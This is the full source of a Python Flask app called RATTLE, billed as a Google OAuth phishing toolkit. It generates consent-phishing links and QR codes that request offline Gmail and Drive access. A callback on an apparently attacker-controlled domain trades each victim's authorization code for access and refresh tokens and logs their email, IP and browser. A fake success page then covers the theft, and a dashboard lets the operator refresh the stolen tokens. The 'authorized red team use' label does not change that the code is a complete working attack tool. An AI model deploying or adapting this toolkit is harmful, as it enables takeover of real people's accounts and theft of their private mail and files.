#!/usr/bin/env python3
# ============================================
# RATTLE - Google OAuth Phishing Toolkit
# Version: 1.0
# For authorized red team use only
# ============================================

import os
import json
import secrets
import datetime
import hashlib
import re
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from werkzeug.security import generate_password_hash, check_password_hash
import requests
from urllib.parse import urlencode
import qrcode
from io import BytesIO
import base64

# ============================================
# Flask App Configuration
# ============================================

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_urlsafe(64)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///rattle.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

db = SQLAlchemy(app)
migrate = Migrate(app, db)

# ============================================
# Custom Jinja2 Filters
# ============================================

@app.template_filter('json_loads')
def json_loads_filter(data):
    """Safely parse JSON string for use in templates"""
    if not data:
        return {}
    try:
        return json.loads(data)
    except:
        return {}

# ============================================
# Database Models
# ============================================

class User(db.Model):
    """Admin user for the panel"""
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    is_admin = db.Column(db.Boolean, default=True)
    
    def set_password(self, password):
        self.password_hash = generate_password_hash(password)
    
    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

class Campaign(db.Model):
    """Phishing campaign"""
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text)
    status = db.Column(db.String(20), default='active')
    client_id = db.Column(db.String(200), nullable=False)
    client_secret = db.Column(db.String(200), nullable=False)
    redirect_uri = db.Column(db.String(200), default='https://wiskon.shop/callback')
    scopes = db.Column(db.Text, default='openid profile email https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/drive.readonly')
    landing_page = db.Column(db.Text, default='default')
    phishing_url = db.Column(db.String(500))
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.datetime.utcnow, onupdate=datetime.datetime.utcnow)
    
    victims = db.relationship('Victim', backref='campaign', lazy=True)
    tokens = db.relationship('Token', backref='campaign', lazy=True)
    
    def generate_phishing_url(self):
        auth_url = (
            "https://accounts.google.com/o/oauth2/v2/auth?"
            f"client_id={self.client_id}&"
            f"redirect_uri={self.redirect_uri}&"
            "response_type=code&"
            f"scope={' '.join(self.scopes.split())}&"
            "access_type=offline&"
            "prompt=consent"
        )
        self.phishing_url = auth_url
        return auth_url

class Victim(db.Model):
    """Victim information"""
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'), nullable=False)
    email = db.Column(db.String(200))
    ip_address = db.Column(db.String(50))
    user_agent = db.Column(db.Text)
    first_seen = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    last_seen = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    status = db.Column(db.String(20), default='pending')
    note = db.Column(db.Text)
    
    tokens = db.relationship('Token', backref='victim', lazy=True)

class Token(db.Model):
    """Captured OAuth tokens"""
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'), nullable=False)
    victim_id = db.Column(db.Integer, db.ForeignKey('victim.id'), nullable=False)
    access_token = db.Column(db.Text)
    refresh_token = db.Column(db.Text)
    token_type = db.Column(db.String(50))
    expires_in = db.Column(db.Integer)
    expiry_time = db.Column(db.DateTime)
    scope = db.Column(db.Text)
    user_info = db.Column(db.Text)
    captured_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    last_used = db.Column(db.DateTime)
    is_active = db.Column(db.Boolean, default=True)
    
    def to_dict(self):
        user_data = {}
        try:
            if self.user_info:
                user_data = json.loads(self.user_info)
        except:
            pass
        
        return {
            'id': self.id,
            'access_token': self.access_token,
            'refresh_token': self.refresh_token,
            'email': user_data.get('email', 'Unknown'),
            'name': user_data.get('name', 'Unknown'),
            'token_type': self.token_type,
            'expires_in': self.expires_in,
            'scope': self.scope,
            'captured_at': self.captured_at.isoformat(),
            'is_active': self.is_active,
            'user_info': user_data
        }

# ============================================
# Create Default Admin User
# ============================================

def create_default_admin():
    with app.app_context():
        if not User.query.filter_by(username='rattle').first():
            admin = User(username='rattle')
            admin.set_password('rattle123')
            db.session.add(admin)
            db.session.commit()
            print("✅ Default admin user created: rattle / rattle123")

# ============================================
# Authentication Routes
# ============================================

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        if user and user.check_password(password):
            session['user_id'] = user.id
            return redirect(url_for('dashboard'))
        return render_template('login.html', error='Invalid credentials')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('login'))

# ============================================
# Dashboard Routes
# ============================================

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    total_campaigns = Campaign.query.count()
    total_victims = Victim.query.count()
    total_tokens = Token.query.count()
    active_campaigns = Campaign.query.filter_by(status='active').count()
    
    recent_tokens = Token.query.order_by(Token.captured_at.desc()).limit(10).all()
    
    from sqlalchemy import text
    victims_by_day = db.session.query(
        db.func.date(Victim.first_seen).label('date'),
        db.func.count(Victim.id).label('count')
    ).group_by('date').order_by(text('date desc')).limit(7).all()
    
    return render_template('dashboard.html',
        total_campaigns=total_campaigns,
        total_victims=total_victims,
        total_tokens=total_tokens,
        active_campaigns=active_campaigns,
        recent_tokens=recent_tokens,
        victims_by_day=victims_by_day
    )

# ============================================
# Campaign Routes
# ============================================

@app.route('/campaigns')
def campaigns():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    all_campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
    return render_template('campaigns.html', campaigns=all_campaigns)

@app.route('/campaign/create', methods=['GET', 'POST'])
def create_campaign():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        campaign = Campaign(
            name=request.form.get('name'),
            description=request.form.get('description'),
            client_id=request.form.get('client_id'),
            client_secret=request.form.get('client_secret'),
            redirect_uri=request.form.get('redirect_uri', 'https://wiskon.shop/callback'),
            scopes=request.form.get('scopes', 'openid profile email https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/drive.readonly')
        )
        campaign.generate_phishing_url()
        db.session.add(campaign)
        db.session.commit()
        return redirect(url_for('campaign_detail', campaign_id=campaign.id))
    
    return render_template('campaign_create.html')

@app.route('/campaign/<int:campaign_id>')
def campaign_detail(campaign_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    campaign = Campaign.query.get_or_404(campaign_id)
    victims = Victim.query.filter_by(campaign_id=campaign_id).all()
    tokens = Token.query.filter_by(campaign_id=campaign_id).order_by(Token.captured_at.desc()).all()
    
    return render_template('campaign_detail.html',
        campaign=campaign,
        victims=victims,
        tokens=tokens
    )

@app.route('/campaign/<int:campaign_id>/delete', methods=['POST'])
def delete_campaign(campaign_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    campaign = Campaign.query.get_or_404(campaign_id)
    db.session.delete(campaign)
    db.session.commit()
    return jsonify({'success': True})

@app.route('/campaign/<int:campaign_id>/generate-qr')
def generate_qr(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(campaign.phishing_url)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    
    return jsonify({'qr_code': img_str})

# ============================================
# Victim Routes
# ============================================

@app.route('/victims')
def victims():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    all_victims = Victim.query.order_by(Victim.first_seen.desc()).all()
    return render_template('victims.html', victims=all_victims)

# ============================================
# Token Routes
# ============================================

@app.route('/tokens')
def tokens():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    all_tokens = Token.query.order_by(Token.captured_at.desc()).all()
    return render_template('tokens.html', tokens=all_tokens)

@app.route('/api/token/<int:token_id>')
def api_token(token_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    token = Token.query.get_or_404(token_id)
    return jsonify(token.to_dict())

@app.route('/token/<int:token_id>/refresh', methods=['POST'])
def refresh_token(token_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    token = Token.query.get_or_404(token_id)
    
    if not token.refresh_token:
        return jsonify({'error': 'No refresh token available'}), 400
    
    token_url = "https://oauth2.googleapis.com/token"
    data = {
        "client_id": token.campaign.client_id,
        "client_secret": token.campaign.client_secret,
        "refresh_token": token.refresh_token,
        "grant_type": "refresh_token"
    }
    response = requests.post(token_url, data=data)
    
    if response.status_code == 200:
        new_token = response.json()
        token.access_token = new_token.get('access_token')
        token.expires_in = new_token.get('expires_in')
        token.expiry_time = datetime.datetime.utcnow() + datetime.timedelta(seconds=token.expires_in)
        token.last_used = datetime.datetime.utcnow()
        db.session.commit()
        return jsonify({'success': True, 'access_token': token.access_token[:30] + '...'})
    else:
        return jsonify({'error': 'Refresh failed'}), 400

# ============================================
# Settings Route
# ============================================

@app.route('/settings', methods=['GET', 'POST'])
def settings():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        current = request.form.get('current_password')
        new = request.form.get('new_password')
        confirm = request.form.get('confirm_password')
        
        user = User.query.get(session['user_id'])
        
        if not user.check_password(current):
            return render_template('settings.html', error='Current password is incorrect')
        
        if len(new) < 6:
            return render_template('settings.html', error='New password must be at least 6 characters')
        
        if new != confirm:
            return render_template('settings.html', error='Passwords do not match')
        
        user.set_password(new)
        db.session.commit()
        return render_template('settings.html', success='Password updated successfully!')
    
    return render_template('settings.html')

# ============================================
# API Routes
# ============================================

@app.route('/api/campaigns/stats')
def campaign_stats():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    stats = {
        'total_campaigns': Campaign.query.count(),
        'total_victims': Victim.query.count(),
        'total_tokens': Token.query.count(),
        'active_campaigns': Campaign.query.filter_by(status='active').count()
    }
    return jsonify(stats)

# ============================================
# OAuth Callback - Token Capture Endpoint
# ============================================

@app.route('/callback')
def oauth_callback():
    auth_code = request.args.get('code')
    
    if not auth_code:
        return "No authorization code received.", 400
    
    campaign = Campaign.query.filter_by(status='active').first()
    if not campaign:
        return "No active campaign found.", 400
    
    token_url = "https://oauth2.googleapis.com/token"
    data = {
        "code": auth_code,
        "client_id": campaign.client_id,
        "client_secret": campaign.client_secret,
        "redirect_uri": campaign.redirect_uri,
        "grant_type": "authorization_code"
    }
    response = requests.post(token_url, data=data)
    
    if response.status_code != 200:
        return f"Token exchange failed: {response.text}", 400
    
    token_data = response.json()
    
    user_info = {}
    try:
        user_response = requests.get(
            "https://www.googleapis.com/oauth2/v2/userinfo",
            headers={"Authorization": f"Bearer {token_data['access_token']}"}
        )
        if user_response.status_code == 200:
            user_info = user_response.json()
    except:
        pass
    
    victim = Victim(
        campaign_id=campaign.id,
        email=user_info.get('email', 'Unknown'),
        ip_address=request.remote_addr,
        user_agent=request.headers.get('User-Agent'),
        status='authorized'
    )
    db.session.add(victim)
    db.session.commit()
    
    token = Token(
        campaign_id=campaign.id,
        victim_id=victim.id,
        access_token=token_data.get('access_token'),
        refresh_token=token_data.get('refresh_token'),
        token_type=token_data.get('token_type'),
        expires_in=token_data.get('expires_in'),
        scope=token_data.get('scope'),
        user_info=json.dumps(user_info),
        expiry_time=datetime.datetime.utcnow() + datetime.timedelta(seconds=token_data.get('expires_in', 3600))
    )
    db.session.add(token)
    db.session.commit()
    
    print(f"\n[+] 🔑 TOKEN CAPTURED!")
    print(f"[+] Email: {user_info.get('email', 'Unknown')}")
    print(f"[+] Campaign: {campaign.name}")
    print(f"[+] Token ID: {token.id}")
    print(f"[+] Access Token: {token.access_token[:50]}...")
    
    return """
    <html>
    <head>
        <title>Authentication Successful</title>
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 50px; background: #f8f9fa; }
            .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
            .icon { font-size: 64px; color: #34a853; }
            h2 { color: #202124; margin: 20px 0; }
            p { color: #5f6368; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="icon">✅</div>
            <h2>Verification Successful</h2>
            <p>You have successfully verified your identity.</p>
            <p style="font-size: 14px; color: #999; margin-top: 20px;">You will be redirected shortly...</p>
            <script>setTimeout(function(){ window.location.href = 'https://www.google.com'; }, 3000);</script>
        </div>
    </body>
    </html>
    """

# ============================================
# Initialize Database
# ============================================

with app.app_context():
    db.create_all()
    create_default_admin()

# ============================================
# Main Entry Point
# ============================================

if __name__ == '__main__':
    print("=" * 60)
    print("🔐 RATTLE - Google OAuth Phishing Toolkit")
    print("=" * 60)
    print("\n✅ Running at: https://wiskon.shop")
    print("🔑 Default login: rattle / rattle123")
    print("\n📊 Dashboard: /dashboard")
    print("📧 Create campaigns: /campaign/create")
    print("🔑 View tokens: /tokens")
    print("=" * 60)
    print("\n🚀 For production, use:")
    print("   gunicorn -w 4 -b 127.0.0.1:8000 app:app")
    print("=" * 60)
    app.run(debug=False, host='127.0.0.1', port=8000)
